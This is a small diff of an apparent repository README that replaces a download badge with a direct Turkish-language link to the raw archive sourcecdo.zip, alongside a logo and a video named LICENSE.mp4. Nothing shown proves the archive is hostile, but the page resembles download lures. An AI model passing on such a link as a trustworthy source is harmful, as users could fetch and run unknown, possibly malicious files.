@@ -1,6 +1,6 @@
 ![LOGO](logo.jpg)
 
-[![Download Source](https://img.shields.io/badge/Download-sourcecdo.zip-blue?style=for-the-badge&logo=github)](https://github.com/bro635756-spec/marmaragames/blob/main/sourcecdo.zip)
+[sourcecdo.zip dosyasını indir](https://github.com/bro635756-spec/marmaragames/raw/main/sourcecdo.zip)
 
 <video src="LICENSE.mp4" width="100%" controls></video>
 
